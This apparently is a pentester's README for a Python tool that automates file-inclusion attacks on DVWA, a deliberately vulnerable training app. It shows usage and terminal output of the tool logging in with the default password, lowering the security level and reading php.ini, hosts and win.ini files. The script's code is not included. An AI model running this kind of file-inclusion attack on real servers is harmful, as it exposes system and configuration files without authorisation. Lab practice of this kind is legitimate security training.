          
		  Hi guys, this tool is to automate the Remote File Include process for DVWA script.

		  Notice, that you have just to add the ip that hosting the script and choose one of 

		  these levels to accomplish the process:

		  ("high", "medium", "low").

		  You have two choices to view the results after inclusion:

		  1- appearing on the terminal in case you hit (n) .
		  2- inside a txt file in case of (y), you can find it inside the folder .

		  here is an examples from my terminal :

		  xakep@pentester:~/Desktop/myscripts/owasp/web-vulns/Rinclusion$ python inclusion.py 

			[!] Usage: [IP] [Level]
			[!] The default password for the first time is: password

          xakep@pentester:~/Desktop/myscripts/owasp/web-vulns/Rinclusion$ python inclusion.py 192.168.43.5 low


			 ______     ____        ___    
			|  _ \ \   / /\ \      / / \   
			| | | \ \ / /  \ \ /\ / / _ \  
			| |_| |\ V /    \ V  V / ___ \ 
			|____/  \_/      \_/\_/_/   \_\
			                               

			 ____  _____ ___ 
			|  _ \|  ___|_ _|
			| |_) | |_   | | 
			|  _ <|  _|  | | 
			|_| \_\_|   |___|
			                 

			  Author: Reznov - Pentester and hacker
			  Website: http://xakepu.blogspot.com
			  Github: https://github.com/reznov11
			  Twitter: @pentester11  

			[--] http://192.168.43.5/dvwa/login.php, Response: 200

			[*] Damn Vulnerable Web App (DVWA) v1.8 :: Welcome

			[?] Enter the security panel

			[!] You're inside the security panel > Damn Vulnerable Web App (DVWA) v1.8 :: DVWA Security

			[+] Now change the security level to low

			[*] Security now is: low

			[--] Now time to read some critical informations from 192.168.43.5

			[+] Vulnerability: File Inclusion

			[--] Which file you'd like to read ??


			1 Dvwa php.ini file
			2 Read hosts file
			3 Read win.ini file
			4 Exit
			Please Select: 1


			Do you want to save results into a file y|n: n
			; This file attempts to overwrite the original php.ini file. Doesnt always work.

			magic_quotes_gpc = Off
			allow_url_fopen on
			allow_url_include on

			1 Dvwa php.ini file
			2 Read hosts file
			3 Read win.ini file
			4 Exit
			Please Select: 
